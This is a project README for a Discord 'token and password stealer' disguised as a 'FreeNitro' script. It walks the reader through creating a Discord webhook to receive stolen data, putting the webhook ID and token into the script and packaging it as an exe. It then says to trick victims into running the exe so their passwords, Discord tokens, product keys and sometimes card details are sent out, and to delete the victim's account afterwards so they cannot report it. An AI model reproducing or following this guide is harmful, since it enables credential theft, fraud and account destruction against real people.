# Token-Password-Stealer

## ⚠️THIS PROJECT IS OUTDATED AND IS BEING REVAMPED AND HAS BEEN ARCHIVED, [HERE](https://github.com/vghcodesjs/Discord-Token-Stealer-v2.0) IS THE NEW REPOSITORY.

## Introduction

I’m going to be telling you a method to grab/finesse people’s passwords, discord tokens, and their product key, and sometimes their credit card information. This method is illegal and against discord TOS. Once you get the victim’s account on discord, log in to it then delete their account. Cause of this, they cannot access your account id to report to Discord

All the files said here will be located in my repository: https://github.com/vghcodesjs/Token-Password-Stealer

# Setting Up your Webhook
## Create Your server
First thing you need to do is go to discord and create a brand new server.

- Hit on the the '+' Logo below your joined servers, and follow the options
- You can change the name and logo of your server (optional)

Once you are in your brand new server, go to the general channel and then click the '⚙' Icon On the channel. These are the setting for your channel. Then go to the 'Integrations' tab and then click on 'Webhooks'. Then click, 'Create Webhook'.

Once you've created a webhook, click 'Copy Webhook URL'

# Setting up the script
Now go and download the FreeNitro.py script. Then go to where it says:
```
# WEBHOOK HERE :
# BELOW IS AN EXAMPLE OF WHAT YOUR WEBHOOK-ID, AND WEBHOOK-TOKEN IS
#                      V "webhID"   V "webhAT"
# discord/api/webhooks/000000000000/token
webhID = "Insert Your Webhook Id"
webhAT = "Insert Your Webhook Token"
```
In your ``webhID``, you have to place your webhook's ID. Use the link you copied from the webhook, and paste it in your browser.

![Image description](https://i.imgur.com/MMXdF2D.png)

The green circled are the Id and Token respectivley. Copy and paste them into the py file.

Then the .py file is finished, and all you have to do is convert the py to an exe.

# Converting to an EXE.
Since this is a huge proccess, here's the link to the repository that explains more about it: https://github.com/brentvollebregt/auto-py-to-exe

# Conclusion
Once You have the exe, open it, and you'll see in your server, that the webhook you put will send a meessage including your passwords, product keys, and tokens on discord. If anyone person opens the exe, it will reveal every detail they have.

In order to grab people's details, you must send the exe to them and force them to download it and run it. This is the entire process. Open an issue if you have a question.
